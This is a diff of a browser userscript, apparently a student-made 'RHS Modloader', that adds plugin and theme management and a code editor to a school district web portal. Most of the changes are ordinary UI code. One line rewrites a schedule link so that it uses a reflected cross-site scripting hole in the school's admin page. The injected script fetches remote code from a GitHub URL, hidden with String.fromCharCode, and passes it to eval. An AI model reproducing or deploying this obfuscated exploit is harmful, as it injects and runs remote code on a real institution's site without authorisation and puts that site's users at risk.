@@ -134,7 +134,9 @@ function loadStylesheet(href) {
 document.loadStylesheet = loadStylesheet;  
 
 //edit schedule override allowing it to work normally when modloaded
-document.querySelector('a[title="Edit your personal schedule"]').href = `https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=%3Cscript%3Efetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,115,101,116,83,99,104,101,100,117,108,101,46,106,115)).then(response=%3Eresponse.text()).then(d=%3Eeval(d))%3C/script%3E`
+if(document.querySelector('a[title="Edit your personal schedule"]')) {
+  document.querySelector('a[title="Edit your personal schedule"]').href = `https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=%3Cscript%3Efetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,115,101,116,83,99,104,101,100,117,108,101,46,106,115)).then(response=%3Eresponse.text()).then(d=%3Eeval(d))%3C/script%3E`;
+}
 
 function renderObject(object) {
   const containerId = object.modName.endsWith('.js') ? 'pluginsContainer' : 'themesContainer';
@@ -146,14 +148,14 @@ function renderObject(object) {
   div.className = "modContainer"
   
   div.innerHTML =
-'<label id="modLabel" class="modTitle ' + encodeURIComponent((object.name ? object.name : object.modName)) + '">' +  (object.name ? object.name : object.modName) + '</label><br>' +
-'<label id="modLabel" class="modAuthor modInfo ' + (object.author ? object.author : "") + '">' +  (object.author ? object.author : "") + '</label><label id="modLabel" class="modVersion modInfo ' + (object.version ? object.version : "") + '">' +  (object.version ? " " + object.version : "") + '</label>' +
-'<input type="checkbox" data-mod-name="' + object.modName + '" ' + (object.state === 1 ? 'checked' : '') + ' onchange="toggleState(\'' + object.modName + '\')">' +
+'<label id="modLabel" class="modTitle ' + encodeURIComponent((object.name ? object.name : object.modName).replace("${this}", object.modName)) + '">' +  (object.name ? object.name : object.modName).replace("${this}", object.modName) + '</label><br>' +
+'<div id="modInfoContainer"><label id="modLabel" class="modAuthor modInfo ' + (object.author ? object.author : "") + '">' +  (object.author ? object.author : "") + '</label><label id="modLabel" class="modVersion modInfo ' + (object.version ? object.version : "") + '">' +  (object.version ? " " + object.version : "") + '</label>' +
+'<div id="actionContainer"><input type="checkbox" data-mod-name="' + object.modName + '" ' + (object.state === 1 ? 'checked' : '') + ' onchange="toggleState(\'' + object.modName + '\')">' +
 '<button id="actionButton" onclick="deleteObject(\'' + object.modName + '\', \'' + containerId + '\', \'' + object.name + '\')" type="button" class="btn btn-outline-danger"> <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash3" viewBox="0 0 16 16"> <path d="M6.5 1h3a.5.5 0 0 1 .5.5v1H6v-1a.5.5 0 0 1 .5-.5ZM11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3A1.5 1.5 0 0 0 5 1.5v1H2.506a.58.58 0 0 0-.01 0H1.5a.5.5 0 0 0 0 1h.538l.853 10.66A2 2 0 0 0 4.885 16h6.23a2 2 0 0 0 1.994-1.84l.853-10.66h.538a.5.5 0 0 0 0-1h-.995a.59.59 0 0 0-.01 0H11Zm1.958 1-.846 10.58a1 1 0 0 1-.997.92h-6.23a1 1 0 0 1-.997-.92L3.042 3.5h9.916Zm-7.487 1a.5.5 0 0 1 .528.47l.5 8.5a.5.5 0 0 1-.998.06L5 5.03a.5.5 0 0 1 .47-.53Zm5.058 0a.5.5 0 0 1 .47.53l-.5 8.5a.5.5 0 1 1-.998-.06l.5-8.5a.5.5 0 0 1 .528-.47ZM8 4.5a.5.5 0 0 1 .5.5v8.5a.5.5 0 0 1-1 0V5a.5.5 0 0 1 .5-.5Z"></path></svg></button>' +
 '<button id="actionButton" onclick="downloadFile(\'' + object.modName + '\', getPluginData(\'' + object.modName + '\'))" type="button" class="btn btn-outline-success"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-box-arrow-in-down" viewBox="0 0 16 16"> <path fill-rule="evenodd" d="M3.5 6a.5.5 0 0 0-.5.5v8a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-8a.5.5 0 0 0-.5-.5h-2a.5.5 0 0 1 0-1h2A1.5 1.5 0 0 1 14 6.5v8a1.5 1.5 0 0 1-1.5 1.5h-9A1.5 1.5 0 0 1 2 14.5v-8A1.5 1.5 0 0 1 3.5 5h2a.5.5 0 0 1 0 1h-2z"></path> <path fill-rule="evenodd" d="M7.646 11.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 10.293V1.5a.5.5 0 0 0-1 0v8.793L5.354 8.146a.5.5 0 1 0-.708.708l3 3z"></path></svg></button>' +
 '<button id="actionButton" onclick="editItem(\'' + object.modName + '\')" type="button" class="btn btn-outline-primary"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-pencil-square" viewBox="0 0 16 16">' +
-'<path d="M15.502 1.94a.5.5 0 0 1 0 .706L14.459 3.69l-2-2L13.502.646a.5.5 0 0 1 .707 0l1.293 1.293zm-1.75 2.456-2-2L4.939 9.21a.5.5 0 0 0-.121.196l-.805 2.414a.25.25 0 0 0 .316.316l2.414-.805a.5.5 0 0 0 .196-.12l6.813-6.814z"/><path fill-rule="evenodd" d="M1 13.5A1.5 1.5 0 0 0 2.5 15h11a1.5 1.5 0 0 0 1.5-1.5v-6a.5.5 0 0 0-1 0v6a.5.5 0 0 1-.5.5h-11a.5.5 0 0 1-.5-.5v-11a.5.5 0 0 1 .5-.5H9a.5.5 0 0 0 0-1H2.5A1.5 1.5 0 0 0 1 2.5v11z"/></svg></button>' +
-'<p id="modLabel" class="desc">' +  (object.description ? object.description : "") + '</p>'
+'<path d="M15.502 1.94a.5.5 0 0 1 0 .706L14.459 3.69l-2-2L13.502.646a.5.5 0 0 1 .707 0l1.293 1.293zm-1.75 2.456-2-2L4.939 9.21a.5.5 0 0 0-.121.196l-.805 2.414a.25.25 0 0 0 .316.316l2.414-.805a.5.5 0 0 0 .196-.12l6.813-6.814z"/><path fill-rule="evenodd" d="M1 13.5A1.5 1.5 0 0 0 2.5 15h11a1.5 1.5 0 0 0 1.5-1.5v-6a.5.5 0 0 0-1 0v6a.5.5 0 0 1-.5.5h-11a.5.5 0 0 1-.5-.5v-11a.5.5 0 0 1 .5-.5H9a.5.5 0 0 0 0-1H2.5A1.5 1.5 0 0 0 1 2.5v11z"/></svg></button></div>' +
+'<p id="modLabel" class="desc">' +  (object.description ? object.description : "").replace("${this}", object.modName) + '</p></div>';
   container.appendChild(div);
 }
 document.renderObject = renderObject;
@@ -168,7 +170,7 @@ function resizeEditor() {
 }
 
 function initCodeEditor() {
-  var editor = document.querySelector('#editorContainer');
+ /* var editor = document.querySelector('#editorContainer');
 
   // Create a new ResizeObserver
   const resizeObserver = new ResizeObserver(entries => {
@@ -179,7 +181,10 @@ function initCodeEditor() {
   });
   
   // Start observing the .popup element for size changes
-  resizeObserver.observe(popup);
+  resizeObserver.observe(popup); */
+
+  // leaving this empty as this was made for codemirror but codemirror broke down when moving to rhs website
+  // and then I found out about monaco editor so rip codemirror
 
   
 }
@@ -226,11 +231,14 @@ document.querySelector("html body div.container-fluid div.flexbar").insertAdjace
   </svg>
   </button>
   
-  <div class="modal fade" id="rhsModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal fade" id="rhsModal" tabindex="-1" aria-labelledby="rhsModalLabel" aria-hidden="true">
     <div class="modal-dialog modal-xl">
       <div class="modal-content">
         <div class="modal-header">
-          <h1 class="modal-title fs-5" id="exampleModalLabel" style="font-size:1.8rem;color:black">RHS Modloader</h1>
+        <div id="rhsModalTitle">
+          <h1 class="modal-title fs-5" id="rhsModalLabel" style="font-size:1.8rem;color:black">RHS Modloader</h1>
+          <h3 class="modal-subtitle fs-5" id= "rhsModalSubtitle" style="font-size:0.7rem">Poy Ozkusaksiz • <span class="version">0.5<beta /></span></h3>
+          </div>
 
 
 
@@ -249,9 +257,9 @@ document.querySelector("html body div.container-fluid div.flexbar").insertAdjace
 
 
 <span class="main-buttons-rhsModal">
-          <button type="button" onclick="togglePopupDisplay()" id="togglePopupButton" class="btn btn-outline-success"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-plus-lg" viewBox="0 0 16 16">
-  <path fill-rule="evenodd" d="M8 2a.5.5 0 0 1 .5.5v5h5a.5.5 0 0 1 0 1h-5v5a.5.5 0 0 1-1 0v-5h-5a.5.5 0 0 1 0-1h5v-5A.5.5 0 0 1 8 2Z"></path>
-</svg></button>
+          <button type="button" onclick="togglePopupDisplay()" title="Display Code Editor" id="togglePopupButton" class="btn btn-outline-success"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-code-slash" viewBox="0 0 16 16">
+          <path d="M10.478 1.647a.5.5 0 1 0-.956-.294l-4 13a.5.5 0 0 0 .956.294l4-13zM4.854 4.146a.5.5 0 0 1 0 .708L1.707 8l3.147 3.146a.5.5 0 0 1-.708.708l-3.5-3.5a.5.5 0 0 1 0-.708l3.5-3.5a.5.5 0 0 1 .708 0zm6.292 0a.5.5 0 0 0 0 .708L14.293 8l-3.147 3.146a.5.5 0 0 0 .708.708l3.5-3.5a.5.5 0 0 0 0-.708l-3.5-3.5a.5.5 0 0 0-.708 0z"/>
+        </svg></button>
           <button type="button" class="btn btn-primary" id="uploadMods" onclick="document.getElementById('fileInput').click()">Upload Files</button>
           </span>
 
@@ -281,6 +289,20 @@ document.querySelector("html body div.container-fluid div.flexbar").insertAdjace
   </div>
   
   <style>
+
+  beta:after {
+    background: #2073f7;
+    border-radius: 3px;
+    content: "BETA";
+    font-size: 14px;
+    padding: 3px;
+    color: white;
+    position: relative;
+    top: -2px;
+    margin-left: 5px;
+    font-weight: bold;
+    }
+
   #modSectionTitle {
     color: black;
   }
@@ -289,6 +311,13 @@ document.querySelector("html body div.container-fluid div.flexbar").insertAdjace
   }
     #modsContainer {
       display: flex;
+    }
+    #rhsModalSubtitle {
+      left: 35px;
+      position: absolute;
+      margin-top: -10px;
+      color: gray;    
+
     }
           .container {
               margin: 6px;
@@ -353,7 +382,7 @@ document.querySelector("html body div.container-fluid div.flexbar").insertAdjace
             }
           }
           .popup {
-z-index: 9;
+z-index: 1056;
 background-color: #f1f1f1;
 border: 1px solid #d3d3d3;
 text-align: center;
@@ -482,7 +511,13 @@ user-select: none; /* Non-prefixed version, currently
   `);
 document.getElementById('fileInput').addEventListener('change', handleFileUpload);
 
-function deleteObject(modName, containerId, objName) {
+function deleteObject(modName, containerId) {
+  if (modName.endsWith(".css")) {
+    const object = JSON.parse(localStorage.getItem(modName));
+    if (object.state) {
+      toggleState(modName)
+    }
+  }
   localStorage.removeItem(modName);
   const container = document.getElementById(containerId);
   const divToRemove = document.getElementById(modName); // Find the div with the specified id
@@ -517,17 +552,37 @@ function getPluginData(pluginName) {
 document.getPluginData = getPluginData;
 
 function loadObjects() {
-    for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        const object = JSON.parse(localStorage.getItem(key));
-        if (object) {
-            renderObject(object);
-            if (object.state === 1 && key.endsWith('.js')) {
-                eval(object.code);
-            }
-        }
-    }
+  for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      const object = JSON.parse(localStorage.getItem(key));
+      renderObject(object);
+      if (object.state === 1 && key.endsWith('.js')) {
+          try {
+              const pluginEval = new Function(object.code);
+              pluginEval();
+          } catch (error) {
+              console.error(
+                `[%cR%cH%cS %cM%co%cd%cl%co%ca%cd%ce%cr%c]: Error in ${key}: ${error.message}`,
+                "color: #a80f1f;",
+                "color: #a80d24;",
+                "color: #a80c2a;",
+                "color: #a70c33;",
+                "color: #a70d38;",
+                "color: #a60f3c;",
+                "color: #a51241;",
+                "color: #a31445;",
+                "color: #a21749;",
+                "color: #a01a4d;",
+                "color: #9e1d51;",
+                "color: #9c2055;",
+                "color: unset;"
+              );
+              
+          }
+      }
+  }
 }
+
 document.loadObjects = loadObjects;
 
 document.addEventListener('keydown', function(event) {
@@ -536,7 +591,7 @@ document.addEventListener('keydown', function(event) {
         location.reload();
     }
 });
-loadObjects()
+loadObjects();
         }
 
         // Get the button and the popup element
@@ -545,8 +600,12 @@ loadObjects()
   const popup = document.querySelector('.popup');
   document.popup = popup;
   
+
+  var loaded = 0;
   // Function to toggle the display state
   function togglePopupDisplay() {
+    if (loaded == 0) {
+      loaded++;
     loadScript("https://cdn.jsdelivr.net/npm/monaco-editor@0.44.0/min/vs/loader.js", function(){
 
 require.config({ paths: { 'vs': 'https://cdn.jsdelivr.net/npm/monaco-editor@0.44.0/min/vs' } });
@@ -574,6 +633,14 @@ document.getElementsByTagName('head')[0].appendChild(style);
     }
     initDragElement();
   }
+  else {
+    if (popup.style.display === 'none' || popup.style.display === '') {
+      popup.style.display = 'block'; // Set it to the default display value
+    } else {
+      popup.style.display = 'none'; // Hide the popup
+    }
+  }
+}
   document.togglePopupDisplay = togglePopupDisplay;
 
   function saveCodeEditor() {  
@@ -744,7 +811,7 @@ document.forceUploadEditor = forceUploadEditor;
         console.error("Error parsing JSON:", error);
       }
     } else {
-      console.log("No data found in localStorage for 'nog.js'.");
+      console.log("No data found in localStorage for this item.");
     }
     }
 
